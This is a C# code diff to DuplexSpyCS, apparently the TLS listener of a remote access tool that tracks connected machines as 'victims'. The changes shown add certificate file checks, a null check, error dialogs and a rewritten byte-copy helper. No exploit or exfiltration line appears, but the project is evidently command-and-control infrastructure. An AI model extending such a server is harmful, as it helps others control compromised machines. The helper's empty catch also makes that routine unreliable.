@@ -14,6 +14,9 @@ namespace DuplexSpyCS
     {
         private X509Certificate m_certificate { get; set; }
         private TcpListener m_listener { get; set; }
+
+        private string m_szCertFile { get; init; }
+        private string m_szCertPass { get; init; }
         
         private List<clsVictim> m_lsVictim = new List<clsVictim>();
         public List<clsVictim> Victims { get { return m_lsVictim; } }
@@ -24,6 +27,12 @@ namespace DuplexSpyCS
             m_nPort = nPort;
             m_szDescription = szDescription;
             m_protocol = enListenerProtocol.TLS;
+
+            m_szCertFile = szCertPath;
+            m_szCertPass = szCertPassword;
+
+            if (!File.Exists(szCertPath))
+                throw new Exception("Certificate file not found: " + szCertPath);
 
             m_certificate = new X509Certificate(szCertPath, szCertPassword);
             m_listener = new TcpListener(IPAddress.Any, nPort);
@@ -40,6 +49,12 @@ namespace DuplexSpyCS
                 MessageBox.Show($"Listener[{m_szName} is already in used.", "fnStart()", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                 return;
             }
+
+            if (string.IsNullOrEmpty(m_szCertFile))
+                throw new Exception("Certificate file is null or empty.");
+
+            if (!File.Exists(m_szCertFile))
+                throw new Exception("File not found: " + m_szCertFile);
 
             Socket sktSrv = m_listener.Server;
             var hSafe = sktSrv.SafeHandle;
@@ -76,6 +91,9 @@ namespace DuplexSpyCS
 
             m_lsVictim.Clear();
 
+            if (m_listener == null)
+                return;
+
             m_listener.Stop();
             m_bIslistening = false;
 
@@ -84,15 +102,19 @@ namespace DuplexSpyCS
 
         private byte[] fnCombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
         {
-            byte[] bytes = null;
-            using (MemoryStream ms = new MemoryStream())
+            var result = new byte[first_len + second_len];
+
+            try
             {
-                ms.Write(first_bytes, first_idx, first_len);
-                ms.Write(second_bytes, second_idx, second_len);
-                bytes = ms.ToArray();
+                Buffer.BlockCopy(first_bytes, first_idx, result, 0, first_len);
+                Buffer.BlockCopy(second_bytes, second_idx, result, first_len, second_len);
+            }
+            catch
+            {
+                
             }
 
-            return bytes;
+            return result;
         }
 
         private void fnAcceptCallback(IAsyncResult ar)
@@ -121,7 +143,7 @@ namespace DuplexSpyCS
             }
             catch (Exception ex)
             {
-
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
         }
 
